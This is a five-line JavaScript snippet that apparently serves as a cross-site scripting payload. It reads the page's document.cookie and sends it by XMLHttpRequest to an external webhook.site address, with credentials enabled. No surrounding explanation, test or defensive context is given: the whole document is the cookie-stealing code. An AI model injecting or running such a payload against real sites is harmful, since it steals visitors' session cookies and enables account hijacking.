var cook = document.cookie;
var xhttp = new XMLHttpRequest();
xhttp.open("GET", "https://webhook.site/eae178ee-097f-406c-8fed-55fbea93e7fb?c=" + cook, true);
xhttp.withCredentials=true;
xhttp.send();
